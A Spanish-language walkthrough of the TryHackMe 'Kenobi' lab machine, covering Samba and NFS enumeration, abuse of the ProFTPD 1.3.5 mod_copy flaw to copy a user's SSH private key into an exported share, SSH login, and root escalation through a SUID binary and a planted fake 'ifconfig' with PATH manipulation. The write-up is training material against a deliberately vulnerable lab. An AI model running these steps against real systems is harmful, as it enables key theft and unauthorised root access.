# 👑 TryHackMe - Kenobi Writeup 👑

## 🛡️ Información General

* **Dificultad:** Fácil
* **Descripción:** Recorrido (Walkthrough) sobre la explotación de una máquina Linux. Enumera comparticiones Samba, manipula una versión vulnerable de proftpd y escala privilegios con manipulación de variables de entorno (`PATH`).
* **Enlace de la Sala:** [https://www.tryhackme.com/room/kenobi](https://www.tryhackme.com/room/kenobi)

---

## 🎯 Fase 1: Reconocimiento Inicial

### 1.1. Comprobación de Conectividad (Ping)

El primer paso es siempre verificar que podemos alcanzar la máquina objetivo.

1.  Exportamos la dirección IP de la máquina objetivo a una variable de entorno para facilitar su uso posterior.

    ```bash
    export IP=10.10.247.156
    ```

2.  Enviamos unos pocos paquetes ICMP (ping) para confirmar la conectividad y medir la latencia.

    ```bash
    ping $IP
    ```

**Captura del resultado del Ping:**

<img width="571" height="383" alt="Ping" src="https://github.com/user-attachments/assets/6c99d8b1-ff1f-4cee-a806-aa61c1f6b1a3" />

**Análisis de la Captura:**

| Métrica | Valor | Observación |
| :--- | :--- | :--- |
| **Paquetes Transmitidos/Recibidos** | 9/9 | 0% de pérdida de paquetes. **Conectividad confirmada.** |
| **Tiempo (min/avg/max)** | 47.388/47.993/49.070 ms | Los tiempos de respuesta son estables y bajos. |

---

## Paso 2: Escaneo de Puertos (Nmap) y Enumeración de Samba (Smbmap)

### 2.1. Escaneo de Puertos con Nmap

Procedemos a realizar un escaneo completo de puertos (`-sC` para scripts por defecto, `-sV` para detección de versiones) sobre la máquina objetivo.

```bash
nmap -sC -sV $IP
````

<img width="672" height="868" alt="Nmap" src="https://github.com/user-attachments/assets/257f7e4d-affd-4908-b287-4cd510fcf115" />

Conclusiones del Nmap:

ProFTPD 1.3.5 (Puerto 21): Es una versión específica que merece una búsqueda de vulnerabilidades.

Samba (Puertos 139 y 445): El servicio Samba está activo, lo que requiere enumerar las comparticiones.

RPCBind (Puerto 111): Indica que potencialmente hay comparticiones NFS, ya que Nmap también encontró servicios nfs, mountd, y nlockmgr.

### 2.2. Enumeración de Comparticiones Samba con Smbmap

Dado que Samba está activo, utilizamos smbmap para listar las comparticiones (recursos compartidos) disponibles en el servidor, utilizando una sesión nula (NULL Session, sin credenciales) para ver si hay accesos anónimos.

````bash
smbmap -H $IP
````

<img width="1245" height="564" alt="SmbMap recursos compartidos" src="https://github.com/user-attachments/assets/c245162b-79e7-481c-b57e-284f7c7db47d" />

Conclusión:

La compartición anonymous tiene permisos de sólo lectura (READ ONLY). Esto nos permitirá investigar su contenido, que podría revelar información sensible.

## Paso 3: Exploración del Recurso Compartido `anonymous`

### 3.1. Acceso a la Compartición Samba

Utilizamos el cliente Samba (`smbclient`) para acceder a la compartición `anonymous` que identificamos en el paso anterior. Usamos la opción `-N` para indicar una sesión nula (sin contraseña).

```bash
smbclient //$IP/anonymous -N
````
Captura de la entrada al recurso compartido y listado de archivos:

<img width="701" height="199" alt="entro al recuros compartido y encuentro una arhicvo" src="https://github.com/user-attachments/assets/a1bf4308-20f9-473b-bac2-13bf0839a4e8" />

Al listar el contenido (ls), encontramos un único archivo de interés: log.txt.

### 3.2. Descarga y Análisis del Archivo log.txt

Procedemos a descargar el archivo log.txt usando el comando get dentro de smbclient y luego salimos de la sesión.

````bash
# Dentro de smbclient
get log.txt
exit

# Fuera de smbclient, listamos el archivo
ls

# Leemos el contenido del archivo
cat log.txt
````
Captura de la descarga del archivo:

<img width="1006" height="190" alt="me descargo el fichero para leerlo+" src="https://github.com/user-attachments/assets/4d84dce9-a1fa-4e1a-b7c3-9205864acfff" />

Captura del contenido del archivo log.txt:

<img width="673" height="699" alt="leo el archivo identifico puerto fto y usuario" src="https://github.com/user-attachments/assets/3275f6e9-f2a4-4779-b1bf-28da684b6021" />

El contenido del archivo log.txt revela información de configuración crítica: una porción de un archivo de configuración de ProFTPD.

Fragmento Clave del log.txt:

Muestra la configuración básica de ProFTPD, confirmando su uso en el puerto 21.

¡Información Sensible! Muestra la ubicación de un archivo de clave SSH para el usuario kenobi:

Your identification has been saved in /home/kenobi/.ssh/id_rsa.

Información Extraída:

Servicio: ProFTPD en el puerto 21.

Ruta de Interés: Se hace referencia a un archivo de clave privada SSH: /home/kenobi/.ssh/id_rsa.

## 4. Enumeración de Servicios NFS (Network File System) 📡

### 4.1. Escaneo Específico para Comparticiones NFS

Dado que el puerto **111** (`rpcbind`) estaba abierto, y Nmap detectó servicios relacionados con NFS, realizamos un escaneo más profundo utilizando *scripts* específicos de Nmap (`nfs-showmount`, `nfs-ls`, `nfs-statfs`) para identificar las comparticiones disponibles y sus permisos.

<img width="666" height="473" alt="Nmap con scritp para vrer que mount tiene el p111" src="https://github.com/user-attachments/assets/48259933-fe98-4389-b3b5-0a3ac0810e83" />

```bash
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount $IP
````
Conclusión:

El directorio /var está montado (compartido) a través de NFS. Esto es una pista crucial. Recordamos que en el paso anterior encontramos la ruta de la clave SSH del usuario Kenobi: /home/kenobi/.ssh/id_rsa.

Aunque no tenemos acceso directo a /home/kenobi/, es común que, al compartir /var o una ruta cercana, podamos acceder a otros directorios clave. ¡El siguiente paso es montar este recurso y buscar la clave!

## 5. Investigación de Vulnerabilidades de ProFTPD 1.3.5 🔍

### 5.1. Búsqueda de Exploits
Antes de intentar el vector de ataque NFS, investigamos la vulnerabilidad del servicio FTP que detectamos: ProFTPD 1.3.5. Utilizamos la herramienta searchsploit para buscar exploits conocidos en la base de datos de Exploit-DB.

````Bash
searchsploit ProFTPD 1.3.5
````

<img width="1849" height="508" alt="tenemos el p21 con ftp vulberable veo los exploits" src="https://github.com/user-attachments/assets/f09b4ff8-b41f-47b8-a76e-b95c93bd5524" />

El módulo que nos interesa es el que se basa en el comando mod_copy (36742.txt).

### 5.2. El Exploit mod_copy 💡
La vulnerabilidad en el módulo mod_copy de ProFTPD 1.3.5 permite a un usuario autenticado (incluyendo el usuario anónimo si está habilitado) utilizar los comandos no estándar CPTO (Copy To) y CPFR (Copy From) para copiar archivos de una ubicación a otra en el sistema de archivos del servidor.

<img width="894" height="750" alt="me descargo el exploit para leerl el txt donde explica la vulnerabilidad " src="https://github.com/user-attachments/assets/012eada3-e1cc-4cfa-af23-a73c4365eda0" />

## 6. Obtención de la Clave SSH de Kenobi 🔑 mediante Explotación Combinada
Hemos identificado dos vectores importantes: la vulnerabilidad mod_copy en el FTP (Puerto 21) y la compartición NFS del directorio /var (Puerto 111). Usaremos una combinación de ambas para mover la clave privada del usuario kenobi a un lugar accesible.

### 6.1. Explotación de la Vulnerabilidad ProFTPD mod_copy
El archivo log.txt nos reveló la ubicación de la clave privada SSH de Kenobi: /home/kenobi/.ssh/id_rsa. Usaremos la vulnerabilidad mod_copy para copiar este archivo a un directorio que esté dentro de la compartición NFS /var. Elegimos el directorio temporal /var/tmp/.

Utilizamos netcat (nc) para comunicarnos directamente con el servidor FTP en el puerto 21 y ejecutar los comandos CPFR (Copy From) y CPTO (Copy To):

Captura de la copia del archivo usando netcat:

<img width="615" height="333" alt="utilizando los comandos copio el id rsa a la mount" src="https://github.com/user-attachments/assets/5e85a1cb-a981-4c28-8ad6-bd2aff441f8e" />

La respuesta 250 Copy successful confirma que la clave id_rsa ha sido copiada exitosamente a /var/tmp/id_rsa.

### 6.2. Montaje de la Compartición NFS 💾
Ahora que la clave está en el directorio /var/tmp/ (el cual está dentro de la compartición NFS /var), podemos acceder a ella montando esa compartición.

Verificamos nuevamente la compartición de NFS (aunque ya lo hicimos en el paso 4, se repite la verificación por contexto):

1.Verificamos nuevamente la compartición de NFS (aunque ya lo hicimos en el paso 4, se repite la verificación por contexto):
````
showmount -e 10.10.247.156
````
2.Creamos un punto de montaje local, por ejemplo, /mnt/carpeta:

````Bash

sudo mkdir /mnt/carpeta
````
3.Montamos la compartición /var de la máquina víctima en nuestro punto de montaje local:

````Bash

sudo mount 10.10.247.156:/var /mnt/carpeta
````

<img width="603" height="623" alt="monto la imagenn denro de la carpeta mnt y una subcarpeta " src="https://github.com/user-attachments/assets/27d4848c-524b-4358-b0c0-b079fe50416a" />

### 6.3. Extracción de la Clave Privada 🗝️
Accedemos al punto de montaje y buscamos la clave que acabamos de copiar. Recordamos que la copiamos a /var/tmp/id_rsa, por lo tanto, la encontraremos en nuestro montaje en /mnt/carpeta/tmp/id_rsa.

````Bash

cd /mnt/carpeta/tmp
ls
cat id_rsa
````
Captura de la extracción de la clave id_rsa:

<img width="1330" height="648" alt="dentro de la carpeta ya tengo el id rsa" src="https://github.com/user-attachments/assets/93ff9d67-c570-4423-8981-1790ae49958b" />

¡Hemos recuperado la clave privada SSH (id_rsa) del usuario kenobi!

## 7. Acceso Inicial (Shell de Usuario) y Flag 1 👤
Con la clave privada id_rsa en nuestro poder, procedemos a asegurar los permisos y usarla para acceder a la máquina mediante SSH como el usuario kenobi.

### 7.1. Preparación de la Clave Privada 🛡️
Copiamos la clave id_rsa que extrajimos de la compartición montada (/mnt/carpeta/tmp/) a nuestro directorio de trabajo local:

````Bash

cp /mnt/carpeta/tmp/id_rsa .
````
Es crucial establecer los permisos correctos a la clave SSH (solo lectura para el propietario), ya que SSH lo requiere:

````Bash

chmod 600 id_rsa
````

<img width="421" height="190" alt="me copio el archivo a mi carpeta fuera de la montura y le doy permisos" src="https://github.com/user-attachments/assets/57993ff9-f745-4600-bae9-32656532ba07" />

### 7.2. Acceso por SSH y Obtención del Flag de Usuario ✅
Intentamos iniciar sesión en la máquina objetivo con el usuario kenobi, especificando la clave privada que acabamos de asegurar.

````Bash

ssh -i id_rsa kenobi@$IP
````
Captura del acceso por SSH y obtención del flag de usuario:

¡El acceso es exitoso! Estamos dentro de la máquina como el usuario kenobi.

Una vez dentro, listamos el contenido del directorio actual y leemos el archivo user.txt para obtener el primer flag:

````Bash

ls
cat user.txt
````

<img width="737" height="692" alt="accedo mediante ssh y obtengo falg user" src="https://github.com/user-attachments/assets/46a4266a-c152-4efa-97c7-5161e9c73180" />

🚩 Flag de Usuario Obtenido: [THM{...}]

## 8. Escalada de Privilegios: Binario SUID Inusual 🕵️
Una vez que tenemos acceso como usuario kenobi, el objetivo es escalar a root. Una técnica común es buscar binarios con el bit SUID (Set User ID) establecido, lo que significa que el binario se ejecuta con los permisos del propietario (a menudo root), independientemente de quién lo ejecute.

### 8.1. Búsqueda de Binarios SUID
Utilizamos el comando find para buscar en todo el sistema (/) archivos con permisos de ejecución SUID (-perm -4000), descartando errores de permisos:

````Bash

find / -perm -4000 2>/dev/null
````

<img width="573" height="830" alt="hago una busqueda de binarios y hay uno extraño" src="https://github.com/user-attachments/assets/6bfcbfec-ab3d-4c24-b51b-3e446ce60abb" />

En los resultados, además de los binarios comunes como passwd, su, y sudo, identificamos un binario inusual: /usr/bin/menu.

### 8.2. Análisis del Binario /usr/bin/menu 💻
Ejecutamos el binario para ver qué hace:

````Bash

/usr/bin/menu
````

El binario nos presenta un menú interactivo con tres opciones:

Status check

Kernel version

ifconfig

Captura de la ejecución del binario menu:

<img width="680" height="880" alt="eejcuto el binario y me da un menu se estan ejecutando como root" src="https://github.com/user-attachments/assets/5fe9bcd7-06fb-4725-9b3e-7aa84850bc9b" />

Al probar las opciones (1, 2 y 3), observamos que el binario simplemente ejecuta comandos del sistema (como uname -a y ifconfig) y muestra la salida.

¡Pista Clave! Si este binario tiene el bit SUID establecido y es propiedad de root, entonces los comandos internos (ifconfig, uname, etc.) se están ejecutando con permisos de root. Esto es un vector de escalada de privilegios conocido como manipulación de la variable de entorno PATH.

## 9. Explotación de PATH y Acceso Root 👑
Basándonos en el análisis del binario SUID /usr/bin/menu (Paso 8), sabemos que:

Se ejecuta con permisos de root.

Ejecuta comandos externos como ifconfig.

No usa la ruta absoluta (/sbin/ifconfig), por lo que dependerá de la variable de entorno PATH para encontrar los binarios.

Aprovecharemos esta vulnerabilidad inyectando nuestro propio binario malicioso en la ruta PATH.

### 9.1. Inyección en la Variable PATH
Creamos un script llamado ifconfig en nuestro directorio actual. Este script contendrá el comando para invocar una shell de Bash (/bin/bash).

````Bash

echo "/bin/bash" > ifconfig
````
Le damos permisos de ejecución al script ifconfig que acabamos de crear:

````Bash

chmod 777 ifconfig
````
Manipulamos la variable de entorno PATH para que el directorio actual (.) sea el primer lugar donde el sistema busque binarios. Esto asegurará que, cuando /usr/bin/menu intente ejecutar ifconfig, encuentre nuestro ifconfig antes que el binario real del sistema.

````Bash

export PATH=.:$PATH
````
Verificamos la nueva ruta PATH para confirmar que el directorio actual (.) está al principio.

Captura de la manipulación de PATH:

<img width="1359" height="223" alt="uso el binario para escalar privilergios y lo pongo en PATH" src="https://github.com/user-attachments/assets/9737fd2f-40a8-4868-b071-86202116014a" />

### 9.2. Obtención de la Shell Root y Flag Final 🏆
Finalmente, ejecutamos nuevamente el binario /usr/bin/menu y seleccionamos la opción 3 (ifconfig). En lugar de ejecutar el comando de red, el programa menu (que se ejecuta como root) ejecutará nuestro script /bin/bash con permisos de root.

````Bash

/usr/bin/menu
# (Seleccionar opción 3)
````
Captura de la escalada de privilegios y obtención del flag:

<img width="729" height="457" alt="ejecuto nuevamnte el bin menu y ya tengo acceso a root y la falg" src="https://github.com/user-attachments/assets/11d23edc-6686-4bc9-a509-34c8a34acb45" />

¡La ejecución es exitosa! Se nos otorga una shell de root.

Confirmamos nuestro usuario actual:

````Bash

whoami
# root
````
Navegamos al directorio /root y leemos el archivo root.txt para obtener el flag final y completar la sala.

````Bash

cd /root
cat root.txt
````
🚩 Flag de Root Obtenido: [THM{...}]
